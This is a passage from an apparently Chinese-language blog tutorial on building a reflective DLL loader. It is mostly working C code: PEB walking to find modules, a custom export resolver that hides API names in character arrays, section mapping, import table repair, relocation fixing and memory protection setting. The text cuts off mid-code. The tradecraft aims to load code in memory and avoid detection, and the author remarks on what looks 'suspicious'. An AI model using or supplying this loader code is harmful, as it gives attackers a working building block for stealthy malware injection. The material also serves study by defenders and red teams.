class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">//----------------GET MODULE HANDLE---------------------</span><br><span class="line">HMODULE GMHR(IN WCHAR szModuleName[]) &#123;   </span><br><span class="line">    PPEBC                   pPeb = (PEBC*)(__readgsqword(0x60));</span><br><span class="line">    // geting Ldr</span><br><span class="line">    PPEBC_LDR_DATA          pLdr = (PPEBC_LDR_DATA)(pPeb-&gt;Ldr);</span><br><span class="line">    // getting the first element in the linked list (contains information about the first module)</span><br><span class="line">    PLDR_DATA_TABLE_ENTRYC  pDte = (PLDR_DATA_TABLE_ENTRYC)(pLdr-&gt;InMemoryOrderModuleList.Flink);</span><br><span class="line"></span><br><span class="line">    while (pDte) &#123;</span><br><span class="line">        // if not null</span><br><span class="line">        if (pDte-&gt;FullDllName.Length != NULL) &#123;</span><br><span class="line"></span><br><span class="line">            // check if both equal</span><br><span class="line">            ToLowerCaseWIDE(pDte-&gt;FullDllName.Buffer);</span><br><span class="line">            ToLowerCaseWIDE(szModuleName);</span><br><span class="line">            if (CompareStringWIDE(pDte-&gt;FullDllName.Buffer, szModuleName)) &#123;</span><br><span class="line"></span><br><span class="line">                return (HMODULE)(pDte-&gt;InInitializationOrderLinks.Flink);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">        // next element in the linked list</span><br><span class="line">        pDte = *(PLDR_DATA_TABLE_ENTRYC*)(pDte);</span><br><span class="line">    &#125;  </span><br><span class="line">    return NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面获取的句柄是指向内存中模块开头的指针，因此我们可以解析 dll 的 PE 标头，获取函数导出表，并且依次进行比较，并且我们的代码考虑了函数转发的情况，函数转发指的是一个 DLL 可以将其导出的函数指向另一个 DLL 的函数，通过转发，系统可以避免重复实现相同的功能。</p><p>GMHR：通过 PEB 找到某个 DLL 的模块基址（HMODULE）</p><p>这段 GMHR 在做的事情：</p><ol><li>通过 GS 寄存器读出 PEB 指针</li><li>从 <code>PEB-&gt;Ldr</code> 拿到 Loader 数据结构</li><li>遍历 <code>InMemoryOrderModuleList</code> 链表</li><li>比较每个模块的 <code>FullDllName</code> &#x2F; <code>BaseDllName</code>，找到名字匹配的模块</li><li>返回该模块的句柄（本质上就是<strong>模块在内存中的基址</strong>）</li></ol><p>关键点解释：</p><ul><li><strong>PEB（Process Environment Block）</strong>：进程里一个很重要的结构，里面有 loader 维护的已加载模块链表。</li><li><code>Ldr-&gt;InMemoryOrderModuleList</code>：链表节点指向每个已加载模块的信息结构（常见是 <code>LDR_DATA_TABLE_ENTRY</code>）。</li><li>HMODULE 是模块句柄：在 Windows 里，<strong>HMODULE 通常就是模块映像基址</strong>，也就是 DLL 映射到内存的起始地址。</li></ul><blockquote><p>Windows 的函数不是散落的，每个API都属于某个模块（DLL）。</p><table><thead><tr><th>API</th><th>所在 DLL</th></tr></thead><tbody><tr><td>VirtualAlloc</td><td>kernel32.dll</td></tr><tr><td>VirtualProtect</td><td>kernel32.dll</td></tr><tr><td>LoadLibraryA</td><td>kernel32.dll</td></tr><tr><td>NtFlushInstructionCache</td><td>ntdll.dll</td></tr><tr><td>MessageBoxA</td><td>user32.dll</td></tr></tbody></table></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*------------------获取函数地址-------------------*/</span></span><br><span class="line"></span><br><span class="line">FARPROC <span class="title function_">GPAR</span><span class="params">(IN HMODULE hModule, IN CHAR lpApiName[])</span> &#123;</span><br><span class="line">    <span class="comment">// 获取模块的基地址</span></span><br><span class="line">    PBYTE pBase = (PBYTE)hModule;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取DOS头</span></span><br><span class="line">    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;</span><br><span class="line">    <span class="comment">// 检查DOS头的魔数是否正确</span></span><br><span class="line">    <span class="keyword">if</span> (pImgDosHdr-&gt;e_magic != IMAGE_DOS_SIGNATURE)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取NT头</span></span><br><span class="line">    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-&gt;e_lfanew);</span><br><span class="line">    <span class="comment">// 检查NT头的签名是否正确</span></span><br><span class="line">    <span class="keyword">if</span> (pImgNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取可选头</span></span><br><span class="line">    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs-&gt;OptionalHeader;</span><br><span class="line">    <span class="comment">// 获取导出目录表</span></span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取函数名数组、函数地址数组和函数序号数组</span></span><br><span class="line">    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfNames);</span><br><span class="line">    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfFunctions);</span><br><span class="line">    PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir-&gt;AddressOfNameOrdinals);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用于处理转发的变量</span></span><br><span class="line">    WCHAR kernel32[] = &#123; <span class="string">L&#x27;K&#x27;</span>, <span class="string">L&#x27;e&#x27;</span>, <span class="string">L&#x27;r&#x27;</span>, <span class="string">L&#x27;n&#x27;</span>, <span class="string">L&#x27;e&#x27;</span>, <span class="string">L&#x27;l&#x27;</span>, <span class="string">L&#x27;3&#x27;</span>, <span class="string">L&#x27;2&#x27;</span>, <span class="string">L&#x27;.&#x27;</span>, <span class="string">L&#x27;d&#x27;</span>, <span class="string">L&#x27;l&#x27;</span>, <span class="string">L&#x27;l&#x27;</span>, <span class="string">L&#x27;\0&#x27;</span> &#125;;</span><br><span class="line">    CHAR loadLibraryA[] = &#123; <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line">    fnLoadLibraryA LLA = <span class="literal">NULL</span>;</span><br><span class="line">    PBYTE functionAddress = <span class="literal">NULL</span>;</span><br><span class="line">    CHAR forwarder[<span class="number">260</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    CHAR dll[<span class="number">260</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    CHAR function[<span class="number">260</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历所有导出的函数</span></span><br><span class="line">    <span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; pImgExportDir-&gt;NumberOfFunctions; i++) &#123;</span><br><span class="line">        <span class="comment">// 获取函数名</span></span><br><span class="line">        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 查找指定的函数名</span></span><br><span class="line">        <span class="keyword">if</span> (ComprareStringASCII(lpApiName, pFunctionName)) &#123;</span><br><span class="line">            <span class="comment">// 获取函数地址</span></span><br><span class="line">            functionAddress = (PBYTE)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 检查函数是否是转发</span></span><br><span class="line">            <span class="keyword">if</span> (functionAddress &gt;= (PBYTE)pImgExportDir &amp;&amp; functionAddress &lt; (PBYTE)(pImgExportDir + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size)) &#123;    </span><br><span class="line">                <span class="comment">// 处理转发字符串</span></span><br><span class="line">                ParseForwarder((CHAR*)functionAddress, dll, function);</span><br><span class="line">                <span class="keyword">if</span> ((LLA = (fnLoadLibraryA)GPAR(GMHR(kernel32), loadLibraryA)) == <span class="literal">NULL</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">                <span class="keyword">if</span> (function[<span class="number">0</span>] == <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line">                    <span class="comment">// 处理转发到指定序号的情况</span></span><br><span class="line">                    <span class="keyword">return</span> GPARO(LLA(dll), custom_stoi(function));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 处理转发到指定函数名的情况</span></span><br><span class="line">                    <span class="keyword">return</span> GPAR(LLA(dll), function);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 返回非转发函数的地址</span></span><br><span class="line">                <span class="keyword">return</span> (FARPROC)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好的，到现在位置我们就可以获取到我们所需要的系统 api 了</p><h3 id="申请-dll-所需要的内存空间"><a href="#申请-dll-所需要的内存空间" class="headerlink" title="申请 dll 所需要的内存空间"></a>申请 dll 所需要的内存空间</h3><p>虽然我们的 dll pe 已经在内存里面了，但是我们还需要更大的一个内存空间对其加载，完成映射节，解析导入表，重定位表等等操作，因此我们需要一片更大的内存空间，我们直接在上面获取系统 api 的步骤中获取 VirtualAlloc 即可，而所需要的内存空间大小是 pe 文件格式里面 IMAGE_OPTIONAL_HEADER 的SizeOfImage 确定</p><blockquote><p> dll pe：这个 DLL 文件的 PE 格式结构数据（原始文件内容）</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ((pebase = (PBYTE)VA(NULL, pImgOptHdr-&gt;SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) == NULL)</span><br><span class="line">        return FALSE;</span><br></pre></td></tr></table></figure><h3 id="复制节"><a href="#复制节" class="headerlink" title="复制节"></a>复制节</h3><p>我们接下来要把节映射过去，由于节在内存中应该是虚拟地址，所以我们不能一股脑复制过去，要借助IMAGE_SECTION_HEADER 里面的VirtualAddress 字段帮助我们复制</p><p>为什么不能一股脑复制整个 DLL？</p><p>因为现在手里 <code>dllBaseAddress</code> 指向的是 <strong>原始 PE 文件字节（文件布局）</strong>，文件布局的特点是：</p><ul><li>节区在文件里按 <code>PointerToRawData</code> 排列（文件偏移）</li><li>节区大小按 <code>SizeOfRawData</code>（文件对齐 FileAlignment）</li><li>节区位置和间隔不等同于运行时的虚拟地址布局</li></ul><p>而运行时真正执行时，CPU&#x2F;代码访问的是：</p><ul><li><strong>RVA（VirtualAddress）</strong> 为基准的布局（内存对齐 SectionAlignment）</li><li>例如 <code>.text</code> 通常从 RVA 0x1000 开始，而不是文件偏移 0x400</li></ul><p>所以必须按节映射，把：文件偏移 → 拷到 → 内存虚拟地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 为节头（section headers）数组分配内存</span></span><br><span class="line">peSections = (PIMAGE_SECTION_HEADER*)custom_malloc((<span class="keyword">sizeof</span>(PIMAGE_SECTION_HEADER) * ImgFileHdr.NumberOfSections), VA);</span><br><span class="line"><span class="keyword">if</span> (peSections == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将节的指针保存到节头数组中</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ImgFileHdr.NumberOfSections; i++) &#123;</span><br><span class="line">    <span class="comment">// 计算每个节头的位置并保存到 peSections 数组中</span></span><br><span class="line">    peSections[i] = (PIMAGE_SECTION_HEADER)(((PBYTE)pImgNtHdrs) + <span class="number">4</span> + <span class="number">20</span> + ImgFileHdr.SizeOfOptionalHeader + (i * IMAGE_SIZEOF_SECTION_HEADER));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将每个节的内容从原始 PE 文件中复制到内存中的相应位置</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ImgFileHdr.NumberOfSections; i++) &#123;</span><br><span class="line">    custom_memcpy(</span><br><span class="line">        <span class="comment">// 目标地址：在内存中的虚拟地址</span></span><br><span class="line">        (PVOID)(pebase + peSections[i]-&gt;VirtualAddress),</span><br><span class="line">        <span class="comment">// 源地址：原始 PE 文件中的偏移地址</span></span><br><span class="line">        (PVOID)(dllBaseAddress + peSections[i]-&gt;PointerToRawData),</span><br><span class="line">        <span class="comment">// 复制的大小</span></span><br><span class="line">        peSections[i]-&gt;SizeOfRawData</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="修复导入表-IAT"><a href="#修复导入表-IAT" class="headerlink" title="修复导入表 IAT"></a>修复导入表 IAT</h2><p>一旦各个节被加载到正确的虚拟地址中，所有的相对虚拟地址（RVA）就开始有意义了。因此，在这里我们可以开始修复导入目录（Import Directory）：遍历我们反射 DLL 需要操作的所有 DLL 列表，导入它们，并根据我们在内存中获得的位置调整每个函数的 RVA。基本上将所有的 RVA 转换为 VA（虚拟地址），即 VA &#x3D; ImageBase + RVA。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; pImgOptHdr-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size; i += <span class="keyword">sizeof</span>(IMAGE_IMPORT_DESCRIPTOR)) &#123;</span><br><span class="line">        <span class="comment">// 获取图像导入描述符的指针</span></span><br><span class="line">        pImgImpDesc = (PIMAGE_IMPORT_DESCRIPTOR)(pebase + pImgOptHdr-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress + i);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用自定义的GetModuleHandle/GetProcAddress来导入DLL</span></span><br><span class="line">        dll = LLA((LPSTR)(pebase + pImgImpDesc-&gt;Name));</span><br><span class="line">        <span class="keyword">if</span> (dll == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取ILT和IAT的引用</span></span><br><span class="line">        pOriginalFirstThunk = (PIMAGE_THUNK_DATA64)(pebase + pImgImpDesc-&gt;OriginalFirstThunk);</span><br><span class="line">        pFirstThunk = (PIMAGE_THUNK_DATA64)(pebase + pImgImpDesc-&gt;FirstThunk);</span><br><span class="line">        <span class="comment">// 如果引用不为空</span></span><br><span class="line">        <span class="keyword">while</span> (pOriginalFirstThunk-&gt;u1.Function != <span class="literal">NULL</span> &amp;&amp; pFirstThunk-&gt;u1.Function != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="comment">// 检查函数是通过序号引用还是通过名称引用的</span></span><br><span class="line">            <span class="keyword">if</span> (pOriginalFirstThunk-&gt;u1.Ordinal &amp; <span class="number">0x8000000000000000</span>) &#123;</span><br><span class="line">                <span class="comment">// 通过保留低16位来获取序号的字节</span></span><br><span class="line">                ordinal = pOriginalFirstThunk-&gt;u1.Ordinal &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">                <span class="comment">// 获取函数地址</span></span><br><span class="line">                funcAddress = GPARO(dll, (<span class="type">int</span>)ordinal);</span><br><span class="line">                <span class="keyword">if</span> (funcAddress != nullptr)</span><br><span class="line">                    <span class="comment">// 调整IAT表（返回的地址与DllBaseAddress相加）</span></span><br><span class="line">                    pFirstThunk-&gt;u1.Function = (ULONGLONG)funcAddress;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 如果函数可以通过其名称找到</span></span><br><span class="line">                pImgImportByName = (PIMAGE_IMPORT_BY_NAME)(pebase + pOriginalFirstThunk-&gt;u1.AddressOfData);</span><br><span class="line">                funcAddress = GPAR(dll, pImgImportByName-&gt;Name);</span><br><span class="line">                <span class="keyword">if</span> (funcAddress != nullptr)</span><br><span class="line">                    pFirstThunk-&gt;u1.Function = (ULONGLONG)funcAddress;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 移动到下一个</span></span><br><span class="line">            pOriginalFirstThunk++;</span><br><span class="line">            pFirstThunk++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="修复重定位表"><a href="#修复重定位表" class="headerlink" title="修复重定位表"></a>修复重定位表</h2><p>现在，导入地址表也已修复，这意味着如果DLL在该进程的内存中执行，它将知道在哪里找到所需的函数。现在是应用基址重定位的时候了，我们可以简要说明一下重定位的工作原理：当程序被编译时，编译器假定一个特定的基址作为可执行文件的基址。然后基于这个基址计算并嵌入了各种地址。然而，可执行文件加载时不太可能正好加载到这个基址。相反，它可能加载到一个不同的地址，这使得所有这些嵌入的地址无效。为了解决这个加载问题，一个包含所有这些需要调整的嵌入地址的列表被存储在PE文件的一个专门表中，称为重定位表（Relocation Table）。这个表位于.reloc节的一个数据目录中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*--------------修复重定位--------------*/</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">// 计算delta，即实际基地址与期望基地址的差值</span></span><br><span class="line"> delta = (ULONG_PTR)pebase - pImgOptHdr-&gt;ImageBase;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 获取重定位表的起始地址</span></span><br><span class="line"> pImgRelocation = (PIMAGE_BASE_RELOCATION)(pebase + pImgOptHdr-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 遍历所有的重定位块</span></span><br><span class="line"> <span class="keyword">while</span> (pImgRelocation-&gt;VirtualAddress) &#123;</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 获取第一个重定位条目的地址</span></span><br><span class="line">     pRelocEntry = (PBASE_RELOCATION_ENTRY)(pImgRelocation + <span class="number">1</span>);</span><br><span class="line">     <span class="comment">// 计算重定位条目的数量（移除头部大小并除以每个条目的大小）</span></span><br><span class="line">     entriesCount = (<span class="type">int</span>)((pImgRelocation-&gt;SizeOfBlock - <span class="number">8</span>) / <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 遍历所有的重定位条目</span></span><br><span class="line">     <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; entriesCount; i++) &#123;</span><br><span class="line"></span><br><span class="line">         <span class="comment">// 根据重定位类型进行处理</span></span><br><span class="line">         <span class="keyword">switch</span> (pRelocEntry-&gt;Type) &#123;</span><br><span class="line">         <span class="keyword">case</span> IMAGE_REL_BASED_DIR64:</span><br><span class="line">         &#123;<span class="comment">// 如果类型为IMAGE_REL_BASED_DIR64（即值为10）</span></span><br><span class="line">             <span class="comment">// 对64位字段应用delta值</span></span><br><span class="line">             ULONGLONG* toAdjust = (ULONGLONG*)(pebase + pImgRelocation-&gt;VirtualAddress + pRelocEntry-&gt;Offset);</span><br><span class="line">             *toAdjust += (ULONGLONG)delta;</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">case</span> IMAGE_REL_BASED_HIGHLOW:</span><br><span class="line">             <span class="comment">// 对32位字段应用delta值</span></span><br><span class="line">         &#123;</span><br><span class="line">             DWORD* toAdjust = (DWORD*)(pebase + pImgRelocation-&gt;VirtualAddress + pRelocEntry-&gt;Offset);</span><br><span class="line">             *toAdjust += (DWORD)delta;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> IMAGE_REL_BASED_HIGH:</span><br><span class="line">             <span class="comment">// 对16位高字段应用delta值的高16位</span></span><br><span class="line">         &#123;</span><br><span class="line">             WORD* toAdjust = (WORD*)(pebase + pImgRelocation-&gt;VirtualAddress + pRelocEntry-&gt;Offset);</span><br><span class="line">             *toAdjust += HIWORD(delta);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> IMAGE_REL_BASED_LOW:</span><br><span class="line">             <span class="comment">// 对16位低字段应用delta值的低16位</span></span><br><span class="line">         &#123;</span><br><span class="line">             WORD* toAdjust = (WORD*)(pebase + pImgRelocation-&gt;VirtualAddress + pRelocEntry-&gt;Offset);</span><br><span class="line">             *toAdjust += LOWORD(delta);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> IMAGE_REL_BASED_ABSOLUTE:</span><br><span class="line">             <span class="comment">// 跳过此类型的重定位。该类型可以用来填充块</span></span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="comment">// 移动到下一个重定位条目</span></span><br><span class="line">         pRelocEntry++;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 移动到下一个重定位块</span></span><br><span class="line">     pImgRelocation = (PIMAGE_BASE_RELOCATION)(reinterpret_cast&lt;DWORD_PTR&gt;(pImgRelocation) + pImgRelocation-&gt;SizeOfBlock);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="为每个节分配正确的内存属性"><a href="#为每个节分配正确的内存属性" class="headerlink" title="为每个节分配正确的内存属性"></a>为每个节分配正确的内存属性</h2><p>我们根据IMAGE_SECTION_HEADER 的Characteristics 字段确定每个节的属性然后为其分配即可</p><blockquote><p>反射 DLL 注入本质上是在手动实现 Windows PE Loader 的工作，而 PE Loader 在加载 DLL 时本来就会根据节属性设置精确的页保护，否则程序无法正常运行。</p><p>如果把所有节都设为：PAGE_EXECUTE_READWRITE虽然能跑，但非常可疑</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ImgFileHdr.NumberOfSections; i++) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (peSections[i]-&gt;Characteristics &amp; IMAGE_SCN_MEM_WRITE) &#123;<span class="comment">//write</span></span><br><span class="line"></span><br><span class="line">        dwProtection = PAGE_WRITECOPY;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (peSections[i]-&gt;Characteristics &amp; IMAGE_SCN_MEM_READ) &#123;<span class="comment">//read</span></span><br><span class="line"></span><br><span class="line">        dwProtection = PAGE_READONLY;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (peSections[i]-&gt;Characteristics &amp; IMAGE_SCN_MEM_EXECUTE) &#123;<span class="comment">//exec</span></span><br><span class="line"></span><br><span class="line">        dwProtection = PAGE_EXECUTE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (peSections[i]-&gt;Characteristics &amp; IMAGE_SCN_MEM_READ &amp;&amp; peSections[i]-&gt;Characteristics &amp; IMAGE_SCN_MEM_WRITE) &#123; <span class="comment">//readwrite</span></span><br><span class="line"></span><br><span class="line">        dwProtection = PAGE_READWRITE;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (peSections[i]-&gt;Characteristics &amp; IMAGE_SCN_MEM_EXECUTE &amp;&amp; peSections[i]-&gt;Characteristics &amp; IMAGE_SCN_MEM_WRITE) &#123; <span class="comment">//executewrite</span></span><br><span class="line"></span><br><span class="line">        dwProtection = PAGE_EXECUTE_WRITECOPY;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span 